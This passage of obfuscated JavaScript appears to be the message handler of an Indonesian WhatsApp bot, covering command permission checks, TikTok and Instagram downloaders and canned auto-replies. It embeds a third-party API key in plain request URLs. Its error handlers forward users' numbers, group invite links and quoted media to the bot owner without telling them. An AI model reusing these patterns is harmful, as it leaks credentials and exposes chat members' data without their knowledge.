                return _0xb45cca.reply("Fitur Tidak Dapat Di Gunakan Dalam Group " + _0xc7f74f);
                break;
              } else if (_0x2d0f5f.nsfw && !_0x5462d5) {
                _0x5f160b(mess.nsfw);
                break;
              } else if (_0x2d0f5f.botAdmin && !_0xb45cca.isBotAdmin) {
                return _0x3c032d();
                break;
              } else if (_0x2d0f5f.admin && !_0xb45cca.isAdmin) {
                return _0x23ea05();
                break;
              }
              if (_0x2d0f5f.private && _0xb45cca.isGroup) {
                return _0x2a7e47();
                break;
              }
              if (_0x2d0f5f.register && !_0x48d6ba.registered) {
                return _0x11ad76();
                break;
              }
              if (_0x2d0f5f.onlyprem && !_0xb45cca.isGroup && !_0x1c9257) {
                return _0x12931b();
                break;
              }
              if (_0x2d0f5f.rpg && _0xb45cca.isGroup && !global.db.data.chats[_0xb45cca.chat].rpg) {
                _0x1a4cf4("rpg");
                break;
              }
              if (_0x2d0f5f.game && _0xb45cca.isGroup && !global.db.data.chats[_0xb45cca.chat].game) {
                _0x1e9c47(mess.game);
                break;
              }
              if (_0x2d0f5f.limit && !_0x1c9257 && _0x48d6ba.limit < _0x2d0f5f.limit * 1) {
                return _0x1ace2b();
              }
              if (_0x2d0f5f.limit && !_0x1c9257 && _0x448b59) {
                _0x48d6ba.limit -= 1;
                _0x357d03("✅ 1 limit terpakai");
              }
              if (_0x4298a6 && _0x2d0f5f.level > _0x48d6ba.level) {
                _0x5c8a1c.reply(_0xb45cca.chat, "[💬] Mohon maaf level yang di perlukan untuk menggunakan fitur ini " + _0x2d0f5f.level + "\n*Level mu:* " + _0x48d6ba.level + " 📊", _0xb45cca, {
                  contextInfo: {
                    externalAdReply: {
                      title: _0x224f61,
                      body: "Akses Di Tolak",
                      sourceUrl: syt,
                      thumbnail: fs.readFileSync("./stik/menhera.jpg")
                    }
                  }
                });
                break;
              }
              if (_0x4298a6 && _0x2d0f5f.age > _0x48d6ba.age) {
                _0x5c8a1c.reply(_0xb45cca.chat, "[💬] Umurmu harus diatas " + _0x2d0f5f.age + " Tahun untuk menggunakan fitur ini...", _0xb45cca, {
                  contextInfo: {
                    externalAdReply: {
                      title: _0x224f61,
                      body: "Akses Di Tolak",
                      sourceUrl: web,
                      thumbnail: fs.readFileSync("./stik/menhera.jpg")
                    }
                  }
                });
                break;
              }
              let _0x1bf209 = {
                setReply: _0x5f160b,
                reply: _0x357d03,
                replyDoc: _0x1e9c47,
                sendSticker: _0x397050,
                sendAnti: _0x491d70,
                sendvn: _0x3d461a,
                dmusic: _0x5858a5,
                sendReact: _0x5d5c7b,
                sendMusic: _0x36233b,
                sendThumb: _0x40c64e,
                onlyOwner: _0x1d17b7,
                onlyAdmin: _0x23ea05,
                onlyBadmin: _0x3c032d,
                onlyPrem: _0x12931b,
                onlyLimit: _0x1ace2b,
                onlyGlimit: _0x281fa4,
                onlyPrivate: _0x2a7e47,
                onlyToko: _0x4e17f4,
                ucapanWaktu: _0x5bc072,
                otw: _0x1f5ab6,
                store: _0x5a5803,
                isAccept: _0x3519b9,
                q: _0x448b59,
                prefix: _0x10ce59,
                usedPrefix: _0x69b4a7,
                noPrefix: _0x37de1f,
                args: _0xe878d3,
                command: _0x451268,
                text: _0x33581c,
                from: _0x284983,
                budy: _0x1f6ab3,
                hanz: _0x5c8a1c,
                participants: _0xb45cca.groupMembers,
                groupMetadata: _0xb45cca.groupMetadata,
                user: _0xb45cca.user,
                bot: _0xb45cca.bot,
                isROwner: _0x5a8dcd,
                isOwner: _0x5a8dcd,
                isRAdmin: _0xb45cca.isRAdmin,
                isAdmin: _0xb45cca.isAdmin,
                isBotAdmin: _0xb45cca.isBotAdmin,
                isPremium: _0x1c9257,
                isResPanel: _0x185182,
                isprems: _0x1c9257,
                chatUpdate: _0x3477fc,
                __dirname: _0x1c4994,
                __filename: _0x2edfbe
              };
              try {
                await _0x2d0f5f.call(_0x5c8a1c, _0xb45cca, _0x1bf209);
              } catch (_0xa94816) {
                if (_0xa94816.message !== undefined) {
                  let _0x2dae9f = util.format(_0xa94816);
                  await _0x5c8a1c.sendText(_0x3bfe61, "]─────「 *SYSTEM-ERROR* 」─────[\n\n" + _0x2dae9f + "\n\n© " + botName, _0xb45cca);
                  if (_0x5599a8) {
                    Failed(toFirstCase(_0x451268), dash);
                  }
                  if (checkError(_0xa94816.message, db.data.listerror)) {
                    return;
                  }
                  addError(_0xa94816.message, _0x451268, db.data.listerror);
                  if (_0x57a03e) {
                    addblockcmd(_0x451268, listcmdblock);
                    await _0x5f160b("Command telah di block karena terjadi error");
                  }
                  await sleep(2000);
                  _0xb45cca.reply(("*🗂️ Plugin:* " + _0xb45cca.plugin + "\n*👤 Sender:* " + _0xb45cca.sender + "\n*💬 Chat:* " + _0xb45cca.chat + "\n*💻 Command:* " + _0x69b4a7 + _0x451268 + " " + _0xe878d3.join(" ") + "\n📄 *Error Logs:*\n\n " + _0x2dae9f).trim(), nomerOwner + "@s.whatsapp.net");
                } else {
                  let _0x3e2875 = util.format(_0xa94816);
                  _0xb45cca.reply("" + _0x3e2875);
                }
              } finally {
                if (typeof _0x2d0f5f.after === "function") {
                  try {
                    await _0x2d0f5f.after.call(_0x5c8a1c, _0xb45cca, _0x1bf209);
                  } catch (_0x3dc311) {
                    console.error(_0x3dc311);
                  }
                }
              }
              break;
            }
          }
          if (_0x16afd0) {
            if (!_0x45f94f) {
              return;
            }
            if (_0x5599a8 && !_0x3519b9) {
              await Nothing(toFirstCase(_0x451268), dash, allcommand);
              const _0x51782f = require("string-similarity");
              let _0x51d77e = await _0x51782f.findBestMatch(toFirstCase(_0x451268), allcommand);
              _0x5f160b("command *" + (_0x10ce59 + _0x451268) + "* tidak ditemukan\nmungkin yang kamu maksud adalah *" + (_0x10ce59 + _0x51d77e.bestMatch.target.toLowerCase()) + "*");
            }
          }
      }
      if (_0x1f6ab3.startsWith("https://vt.tiktok.com/") || _0x1f6ab3.startsWith("https://www.tiktok.com/") || _0x1f6ab3.startsWith("https://vm.tiktok.com/")) {
        try {
          let _0x16c6ef = await fetch("https://skizoasia.xyz/api/tiktok?url=" + _0x1f6ab3 + "&apikey=Rangelofficial");
          let _0x3f34f1 = await _0x16c6ef.json();
          let _0x4faeb6 = "*🎵 乂 Tiktok Downloader 🎵*\n\n" + ("👤 *Nama:* " + _0x3f34f1.data.author.nickname + "\n") + ("🆔 *Nickname:* @" + _0x3f34f1.data.author.unique_id + "\n") + ("📅 *ID:* " + _0x3f34f1.data.id + "\n") + ("📝 *Deskripsi:* " + _0x3f34f1.data.title);
          await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
            react: {
              text: "⏳",
              key: _0xb45cca.key
            }
          });
          await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
            video: {
              url: _0x3f34f1.data.play
            },
            caption: _0x4faeb6
          }, {
            quoted: _0xb45cca
          });
        } catch (_0x48d1cb) {
          console.log(_0x48d1cb);
        }
      }
      if (_0x1f6ab3.startsWith("https://www.instagram.com/reel/") || _0x1f6ab3.startsWith("https://www.instagram.com/p/")) {
        try {
          let _0x3d6e0f = await fetchJson("https://skizoasia.xyz/api/instagram?apikey=Rangelofficial&url=" + _0x1f6ab3 + "}");
          await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
            react: {
              text: "⏳",
              key: _0xb45cca.key
            }
          });
          for (let _0x4da498 of _0x3d6e0f.media) {
            await sleep(100);
            await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
              video: {
                url: _0x4da498
              },
              caption: "*乂 Instagram Downloader*\n\n" + _0x3d6e0f.caption
            }, {
              quoted: _0xb45cca
            });
          }
        } catch (_0x12a544) {
          _0xb45cca.reply(_0x12a544);
        }
      }
      if (katabot.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x3140c1);
      }
      if (katalopyu.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x2e29dc);
      }
      if (ohayo.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        if (_0xb6ca5a >= "11:00" && _0xb6ca5a <= "23:50") {
          return _0x5f160b("Hadeuh sekarang udah ga pagi kak");
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x52ba54);
      }
      if (katamalem.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        if (_0xb6ca5a >= "06:00" && _0xb6ca5a <= "17:00") {
          return _0x5f160b("Hadeuh sekarang udah ga malem kak");
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x5b5a4b);
      }
      if (katasiang.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        if (_0xb6ca5a >= "06:00" && _0xb6ca5a <= "00:00") {
          return _0x5f160b("Hadeuh sekarang udah ga siang kak");
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x48a1a2);
      }
      if (_0x1f6ab3.startsWith("Assalamualaikum") || _0x1f6ab3.startsWith("Assalamu'alaikum") || _0x1f6ab3.startsWith("assalamualaikum")) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x59789a);
      }
      if (_0x1f6ab3.startsWith("SALKEN") || _0x1f6ab3.startsWith("salken")) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0xb45cca.reply("salam kenal juga " + _0x224f61);
      }
      if (katara.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0x22bd9a);
      }
      if (_0x45f94f && _0x1f6ab3.includes("" + devoloper1)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        const _0x41dad0 = ["*Iya kak itu nomer ayang aku ada apa ya ??*\n", "*Jangan di tag dia sedang sibuk.*\n", "*Kenapa kak tag ayang aku??*\n"];
        const _0x4e6ab7 = _0x41dad0[Math.floor(Math.random() * _0x41dad0.length)];
        _0x5c8a1c.sendMessage(_0xb45cca.chat, {
          text: "@" + _0xb45cca.chat,
          contextInfo: {
            mentionedJid: false,
            groupMentions: [{
              groupJid: _0xb45cca.chat,
              groupSubject: _0x4e6ab7
            }]
          }
        }, {
          quoted: _0xb45cca
        });
      }
      if ((_0x251560 === "groupInviteMessage" || _0x1f6ab3.includes("https://chat") || _0x1f6ab3.includes("Buka tautan ini")) && !_0xb45cca.isBaileys && !_0x45f94f && !_0xfcd2a2 && !_0x5a8dcd) {
        let _0x46d728 = dada(_0x10ce59, _0x224f61, _0x5bc072);
        _0x357d03(_0x46d728);
      }
      if (_0x1f6ab3.includes("ekprefix")) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        conn.sendMessage(_0x284983, {
          text: "Baik kak untuk prefix saat ini adalah : 「  " + _0x503d4f + "  」"
        }, {
          quoted: _0xb45cca
        });
      }
      if (bad.includes(_0x1f6ab3)) {
        if (cekSpam("NotCase", _0x289dbe, AntiSpam)) {
          return;
        }
        addSpam("NotCase", _0x289dbe, "10s", AntiSpam);
        _0x3d461a(_0xf322bb);
      }
    } catch (_0x419cfc) {
      Log(_0x419cfc);
      if (_0x5599a8) {
        Failed(toFirstCase(_0x451268), dash);
      }
      let _0x5e5d27 = util.format(_0x419cfc);
      if (_0x419cfc.message.includes("Cannot find module")) {
        let _0x172826 = _0x419cfc.message.split("Cannot find module '")[1].split("'")[0];
        let _0x51743c = "Module " + _0x172826 + " belom di install\nsilakan install terlebih dahulu";
        return await _0x5c8a1c.sendText(_0xb45cca.key.remoteJid, _0x51743c, _0xb45cca);
      }
      await _0x5c8a1c.sendText(_0x3bfe61, "]─────「 *SYSTEM-ERROR* 」─────[\n\n" + _0x5e5d27 + "\n\n© " + fake, _0xb45cca);
      if (checkError(_0x419cfc.message, db.data.listerror)) {
        return;
      }
      addError(_0x419cfc.message, _0x451268, db.data.listerror);
      if (_0x57a03e) {
        addblockcmd(_0x451268, listcmdblock);
        await _0x5f160b("Command telah di block karena terjadi error");
      }
      if (_0x48ecea) {
        if (_0x32d9af) {
          var _0x3131c7 = "Reply Image ✅";
        } else if (_0x2d87f8) {
          var _0x3131c7 = "Reply Video ✅";
        } else if (_0xb7eef2) {
          var _0x3131c7 = "Reply Sticker ✅";
        } else if (_0x188437) {
          var _0x3131c7 = "Reply Audio ✅";
        } else if (_0x49d270) {
          var _0x3131c7 = "Reply Teks ✅";
        } else if (_0x370f0d) {
          var _0x3131c7 = "Reply Tag ✅";
        } else {
          var _0x3131c7 = "No Quoted ❌";
        }
        if (_0x448b59.length > "0") {
          var _0x2ed411 = _0x448b59;
        } else if (_0x448b59.length == "0") {
          var _0x2ed411 = "No Query ❌";
        }
        if (_0x45f94f && _0x424997) {
          let _0x506f73 = await _0x5c8a1c.groupInviteCode(_0x284983);
          var _0x11e6e9 = "https://chat.whatsapp.com/" + _0x506f73;
        } else if (_0x45f94f && !_0x424997) {
          var _0x11e6e9 = "Botz Is Not Admin";
        } else if (!_0x45f94f) {
          var _0x11e6e9 = "Botz Is Not In The Group";
        }
        let _0x56de58 = "\n*]─── 「 Laporan Bug ⚠️」 ───[*\n\n👤 Nama : " + _0x224f61 + "\n📳 Nomer : wa.me/" + _0x289dbe + "\n📢 Info Laporan :\n       _" + _0x5e5d27 + "_\n🔖 Command : " + _0x10ce59 + _0x451268 + "\n⏰Time : " + _0xb6ca5a + " Wib\n📝 Query : " + _0x2ed411 + "\n🧩 Quoted : " + _0x3131c7 + "\n💠 Group : " + (_0x45f94f ? "" + _0xc7f74f : "Di private chat") + "\n🆔 ID : " + _0x284983 + "\n🌐 Link Group : " + _0x11e6e9 + "\n\n\n";
        _0x5c8a1c.sendText(_0x3bfe61, _0x56de58, _0xb45cca);
        if (_0xb7eef2 || _0x32d9af || _0x2d87f8 || _0x188437) {
          let _0x3261cd = await _0x5c8a1c.downloadAndSaveMediaMessage(_0x38cde7, makeid(5));
          await _0x5c8a1c.sendMedia(_0x3bfe61, _0x3261cd, _0xb45cca, {
            caption: "System Error"
          });
          await fs.unlinkSync(_0x3261cd);
        }
      }
    }
  } catch (_0x1f3a07) {
    console.log(chalk.bgRed(color("[  ERROR  ]", "black")), util.format(_0x1f3a07));
    let _0x45382b = String(_0x1f3a07);
    if (_0x45382b.includes("this.isZero")) {
      return;
    }
    if (_0x45382b.includes("rate-overlimit")) {
      if (!_0x9fc6bc) {
        return;
      }
      _0x9fc6bc = false;
      await _0x5c8a1c.sendMessage(nomerOwner + "@s.whatsapp.net", {
        text: "Terjadi rate-overlimit\nBot telah mengganti dari mode Public ke mode Self\nUntuk menghindari spam yang berlebihan,\nSilakan tunggu 1 menit hingga semua pesan\ntelah terbaca oleh bot"
      });
      await setTimeout(() => {
        _0x9fc6bc = true;
        _0x5c8a1c.sendMessage(nomerOwner + "@s.whatsapp.net", {
          text: "Berhasil mengubah mode self ke mode public"
        });
      }, 60000);
      return;
    }
    if (_0x45382b.includes("Connection Closed")) {
      return;
    }
    if (_0x45382b.includes("Timed Out")) {
      return;
    }
    if (_0x45382b.includes("Value not found")) {
      return;
    }
    console.log(color("Message Error : %s", "white"), color(util.format(_0x45382b), "green"));
    if (Console) {
      _0x5c8a1c.sendMessage(_0x3bfe61, {
        text: util.format(_0x45382b)
      });
    }
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.bgGreen(color("[  UPDATE ]", "black")), chalk.white("" + __filename));
  delete require.cache[file];
  require(file);
});